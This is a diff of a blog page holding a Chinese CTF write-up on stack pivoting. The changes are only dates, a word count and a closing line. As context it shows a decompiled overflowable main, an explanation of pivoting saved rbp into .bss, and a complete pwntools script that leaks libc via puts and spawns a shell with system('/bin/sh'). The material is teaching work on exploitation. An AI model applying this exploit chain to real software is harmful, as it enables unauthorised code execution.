@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://roxy5201314.github.io/images/4.png">
 <meta property="article:published_time" content="2025-12-24T21:26:45.000Z">
-<meta property="article:modified_time" content="2026-01-16T03:28:32.633Z">
+<meta property="article:modified_time" content="2026-02-12T14:02:20.425Z">
 <meta property="article:author" content="roxy">
 <meta property="article:tag" content="ret2libc">
 <meta property="article:tag" content="内存布局">
@@ -227,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.2k 字
+          3.3k 字
         
       </span>
     
@@ -285,6 +285,7 @@
 <p>来看看吧!</p>
 <p>题目逻辑非常之简单</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
 <p>题目的保护只有<code>NX</code></p>
 <p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p>
 <p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p>
@@ -320,6 +321,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>感谢阅读…</p>
+<p>生活愉快!</p>
 
                 
               </div>
@@ -388,7 +390,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年1月16日</div>
+          <div>2026年2月12日</div>
         </div>
       
       
